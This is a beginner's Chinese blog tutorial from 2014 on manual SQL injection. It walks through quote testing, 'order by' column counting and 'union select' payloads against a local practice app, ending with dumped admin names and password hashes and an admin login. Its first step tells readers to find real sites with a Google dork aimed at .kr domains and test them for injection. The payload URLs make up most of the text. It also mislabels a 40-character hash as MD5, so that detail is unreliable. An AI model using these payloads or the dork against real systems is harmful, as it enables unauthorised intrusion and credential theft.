title: '手动sql注入（初级篇）'
date: 2014-07-15 20:36
tags: sql注入
---

我也是才学 sql 注入一个星期，此篇文章是学给初学者看的
推荐书籍 《sql注入攻击与防御》[http://www.ddooo.com/softdown/50160.htm](http://www.ddooo.com/softdown/50160.htm)
<!--more-->

#1、找到存在sql注入的网站

  __方法__：在google中输入 site:kr inurl:php?id=
    打开出现的网址，在网址后面添加 ’  （英文逗号）如果页面出现跳转 说明可能存在sql注入
__原理__：一般网址都是类似  search.php?search=hello
   相应的sql语句 可能是 select \* from table_name where column_name='hello'
   如果在网址后面添加 ‘   则sql语句为  select \* from table_name where column_name='hello'’
   如果网站没有进行sql注入过滤，会报错
在GitHub有个Web漏洞演练项目，可以下载后部署在自己的电脑上（这里我就不教大家部署了，熟悉Web编程的大部分都会）
        [https://github.com/710leo/ZVulDrill](https://github.com/710leo/ZVulDrill)

网页内容如下
![](http://img.blog.csdn.net/20140715201016711)



#2、检测字段长度

__(1) __
http://localhost/ZVulDrill-master/search.php?search=hello%' order by 1--%20
相当于sql语句 select \* from table_name where colmun_name like '%hello%' order by 1 -- '
说明 MySQL有三种注释 -- 是其中一种 但是 -- 后面要跟一个空格才有效 但是网址会自动去掉最后一个空格需要手动输入%20
注释后面的sql语句不执行
__(2)  __此时页面没有出错，用同样的方式 添加 order by 10
页面出错，然后 order by 5 出错，order by 4 页面正确
 说明字段长  4

#3、查看数据库信息

      __方法__：使用union语句提取数据  
__    (1)__   http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union select 1,2,2,4 --%20
sql语句  select \* from table_name where column_name like '%hello%' and 1=2 union select 1,2,3,4
union前的sql语句中 where条件恒为假，结果集为空，整个sql语句返回的是union后面的结果集
![](http://img.blog.csdn.net/20140715201042343)


__<span style="font-size:14px">   
</span><span style="font-size:18px">(2)  </span>__获取MySQL version user database 等相关信息
   如上图所示，页面上显示 1,2 ，可以利用这个来显示我们需要的信息
 http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union
 select 1,version(),user(),4 --%20
  即  将 2，3 换成 version(),user()
  页面如下
![](http://img.blog.csdn.net/20140715201431834)


同理将 user() 换成 database()  得到数据库名  zvuldrill


user() ------------    wkdty@localhost
version()  --------------   5.6.17 （5.0以上的版本都带有一个 information_schema 的虚拟库里面存放的是所有库的信息.）
 database()   -------------  zvuldrill



#4、获取数据库数据

 
__(1)__获取表名
http://localhost/ZVulDrill-master/search.php?search=hello%'
 and 1=2 union select 1,2,GROUP_CONCAT(DISTINCT table_name),4 from information_schema.columns where table_schema='zvuldrill'--%20
![](http://img.blog.csdn.net/20140715202557175)


数据库中有3张表，对我们最有用的是admin这张表，以管理员身份进入网站可以看到各种信息
__(2)__获取字段名
http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2
 union select 1,2,GROUP_CONCAT(DISTINCT column_name),4 from information_schema.columns where table_name='admin'--%20


![](http://img.blog.csdn.net/20140715202931238)






__(3)__获取数据
http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union
 select 1,2,GROUP_CONCAT(DISTINCT admin_id,admin_name,admin_pass),4 from admin--%20





![](http://img.blog.csdn.net/20140715203207348)


  admin_id 1 
admin_name admin
admin_pass d033e22ae348aeb5660fc2140aec35850c4da997
   (md5解密之后  得到admin)
根据用户登录入口，找到后台登录入口  ，以管理员身份进入网站

